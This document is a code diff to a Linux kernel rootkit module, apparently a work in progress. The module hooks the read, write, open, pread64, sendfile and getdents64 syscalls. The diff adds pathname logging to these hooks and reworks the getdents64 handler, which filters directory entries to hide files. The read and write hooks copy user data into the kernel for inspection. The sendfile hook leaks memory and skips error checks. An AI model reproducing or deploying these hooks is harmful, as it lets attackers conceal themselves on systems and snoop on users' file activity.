@@ -1,13 +1,12 @@
 #include "rootkit-main.h"
 
+#include "files.h"
 #include "hooking.h"
 #include "macro-utils.h"
 #include "utils.h"
 #include <linux/dirent.h>
-#include <linux/ioctl.h>
+#include <linux/err.h>
 #include <linux/limits.h>
-#include <linux/linkage.h>
-#include <linux/miscdevice.h>
 #include <linux/mm.h>
 #include <linux/module.h>
 #include <linux/printk.h>
@@ -55,21 +54,29 @@ static __exit void rootkit_exit(void)
 SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __user *, s_buf, size_t,
                       sz_count)
 {
-    long l_err   = 0;
-    long l_ret   = 0;
-    char *s_data = NULL;
+    long l_err       = 0;
+    long l_ret       = 0;
+    char *s_data     = NULL;
+    char *s_pathname = NULL;
 
     pr_info("[ROOTKIT] read(%u, %p, %zu)", ui32_fd, s_buf, sz_count);
 
     l_ret = orig_read(p_regs);
     pr_cont(" = %ld\n", l_ret);
 
+    s_pathname = fd_get_pathname(ui32_fd);
+    if (IS_ERR_OR_NULL(s_pathname)) {
+        s_pathname = kstrdup("(error)", GFP_KERNEL);
+    }
+    pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
+    kvfree(s_pathname);
+
     s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
 
     if (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
     } else {
-        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);
+        l_err = strncpy_from_user(s_data, s_buf, sz_count);
 
         if (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
@@ -88,21 +95,29 @@ SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __use
 SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const char __user *, s_buf,
                       size_t, sz_count)
 {
-    long l_err   = 0;
-    long l_ret   = 0;
-    char *s_data = NULL;
+    long l_err       = 0;
+    long l_ret       = 0;
+    char *s_data     = NULL;
+    char *s_pathname = NULL;
 
     pr_info("[ROOTKIT] write(%u, %p, %zu)", ui32_fd, s_buf, sz_count);
 
     l_ret = orig_write(p_regs);
     pr_cont(" = %ld\n", l_ret);
 
+    s_pathname = fd_get_pathname(ui32_fd);
+    if (IS_ERR_OR_NULL(s_pathname)) {
+        s_pathname = kstrdup("(error)", GFP_KERNEL);
+    }
+    pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
+    kvfree(s_pathname);
+
     s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
 
     if (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
     } else {
-        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);
+        l_err = strncpy_from_user(s_data, s_buf, sz_count);
 
         if (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
@@ -121,29 +136,22 @@ SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const ch
 SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                       umode_t, ui16_mode)
 {
-    long l_err         = 0;
     long l_ret         = 0;
     char *s_filename_k = NULL;
 
     l_ret = orig_open(p_regs);
 
-    s_filename_k = (char *)kvmalloc(PATH_MAX, GFP_KERNEL);
+    s_filename_k = strndup_user(s_filename, PATH_MAX);
 
-    if (s_filename_k == NULL) {
-        pr_err("[ROOTKIT] * Could not allocate memory\n");
-    } else {
-        l_err = strncpy_from_user(s_filename_k, s_filename, PATH_MAX);
-
-        if (l_err < 0) {
-            pr_err("[ROOTKIT] * Could not copy filename from user\n");
-            strncpy(s_filename_k, "(unknown)", PATH_MAX);
-        }
-
-        pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho) = %ld\n", s_filename_k, i32_flags, ui16_mode,
-                l_ret);
-
-        kvfree(s_filename_k);
+    if (IS_ERR_OR_NULL(s_filename_k)) {
+        pr_err("[ROOTKIT] * Could not copy filename from user\n");
+        // strncpy(s_filename_k, "(unknown)", PATH_MAX);
+        s_filename_k = kstrdup("(unknown)", GFP_KERNEL);
     }
+
+    pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho) = %ld\n", s_filename_k, i32_flags, ui16_mode, l_ret);
+
+    kvfree(s_filename_k);
 
     return l_ret;
 }
@@ -152,21 +160,29 @@ SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, 
 SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char __user *, s_buf,
                       size_t, sz_count, loff_t, i64_pos)
 {
-    long l_err   = 0;
-    long l_ret   = 0;
-    char *s_data = NULL;
+    long l_err       = 0;
+    long l_ret       = 0;
+    char *s_data     = NULL;
+    char *s_pathname = NULL;
 
     pr_info("[ROOTKIT] pread64(%u, %p, %zu, %lld)", ui32_fd, s_buf, sz_count, i64_pos);
 
     l_ret = orig_pread64(p_regs);
     pr_cont(" = %ld\n", l_ret);
 
+    s_pathname = fd_get_pathname(ui32_fd);
+    if (IS_ERR_OR_NULL(s_pathname)) {
+        s_pathname = kstrdup("(error)", GFP_KERNEL);
+    }
+    pr_info("[ROOTKIT] * File name: %s\n", s_pathname);
+    kvfree(s_pathname);
+
     s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);
 
     if (s_data == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
     } else {
-        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);
+        l_err = strncpy_from_user(s_data, s_buf, sz_count);
 
         if (l_err < 0) {
             pr_err("[ROOTKIT] * Could not copy data from user\n");
@@ -185,19 +201,26 @@ SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char
 SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32_in_fd,
                       loff_t __user *, p_offset, size_t, sz_count)
 {
-    long l_ret = 0;
+    long l_ret           = 0;
+    char *s_pathname_in  = NULL;
+    char *s_pathname_out = NULL;
 
     pr_info("[ROOTKIT] sendfile(%d, %d, %p, %zu)", i32_out_fd, i32_in_fd, p_offset, sz_count);
 
     l_ret = orig_sendfile(p_regs);
     pr_cont(" = %ld\n", l_ret);
 
+    s_pathname_in  = fd_get_pathname(i32_in_fd);
+    s_pathname_out = fd_get_pathname(i32_out_fd);
+    pr_info("[ROOTKIT] *  In file name: %s\n", s_pathname_in);
+    pr_info("[ROOTKIT] * Out file name: %s\n", s_pathname_out);
+
     return l_ret;
 }
 
 // sys_getdents syscall hook handler
-SYSCALL_HOOK_HANDLER3(getdents, orig_getdents, p_regs, unsigned int, ui32_fd,
-                      struct linux_dirent __user *, p_dirent, unsigned int, ui32_count)
+SYSCALL_HOOK_HANDLER3(getdents, orig_getdents, p_regs, unsigned int, ui32_fd, dirent_t __user *,
+                      p_dirent, unsigned int, ui32_count)
 {
     pr_info("[ROOTKIT] getdents(%u, %p, %u)\n", ui32_fd, p_dirent, ui32_count);
     // TODO: Implement same logic as getdents64
@@ -208,21 +231,29 @@ SYSCALL_HOOK_HANDLER3(getdents, orig_getdents, p_regs, unsigned int, ui32_fd,
 
 // sys_getdents64 syscall hook handler
 SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd,
-                      struct linux_dirent64 __user *, p_dirent, unsigned int, ui32_count)
+                      dirent64_t __user *, p_dirent, unsigned int, ui32_count)
 {
-    long l_ret_orig          = 0; // Original return value of the real syscall
-    long l_ret               = 0; // Return value that will be returned to the caller
-    long l_err               = 0; // Error code of the copy functions
-    long l_move_len          = 0; // Length of the data to move
-    unsigned short us_reclen = 0; // Length of the current directory entry
+    long l_ret_orig          = 0;    // Original return value of the real syscall
+    long l_ret               = 0;    // Return value that will be returned to the caller
+    long l_err               = 0;    // Error code of the copy functions
+    long l_move_len          = 0;    // Length of the data to move
+    unsigned short us_reclen = 0;    // Length of the current directory entry
+    char *s_pathname         = NULL; // Pathname of the directory
 
-    struct linux_dirent64 *p_dirent_k    = NULL; // Kernel buffer for directory entry array
-    struct linux_dirent64 *p_dirent_k_it = NULL; // Directory entry array iterator
+    dirent64_t *p_dirent_k    = NULL; // Kernel buffer for directory entry array
+    dirent64_t *p_dirent_k_it = NULL; // Directory entry array iterator
 
     pr_info("[ROOTKIT] getdents64(%u, %p, %u)", ui32_fd, p_dirent, ui32_count);
 
     l_ret_orig = orig_getdents64(p_regs);
     pr_cont(" = %ld\n", l_ret_orig);
+
+    s_pathname = fd_get_pathname(ui32_fd);
+    if (IS_ERR_OR_NULL(s_pathname)) {
+        s_pathname = kstrdup("(error)", GFP_KERNEL);
+    }
+    pr_info("[ROOTKIT] * Directory name: %s\n", s_pathname);
+    kvfree(s_pathname);
 
     if (l_ret_orig <= 0) {
         // No entries or error, return immediately
@@ -234,7 +265,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
         return l_ret_orig;
     }
 
-    p_dirent_k = (struct linux_dirent64 *)kzalloc(l_ret_orig, GFP_KERNEL);
+    p_dirent_k = (dirent64_t *)kzalloc(l_ret_orig, GFP_KERNEL);
 
     if (p_dirent_k == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
@@ -276,7 +307,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
             l_ret -= us_reclen;
         } else {
             // Update the iterator to the next directory entry
-            p_dirent_k_it = (struct linux_dirent64 *)((char *)p_dirent_k_it + us_reclen);
+            p_dirent_k_it = (dirent64_t *)((char *)p_dirent_k_it + us_reclen);
         }
     }
 
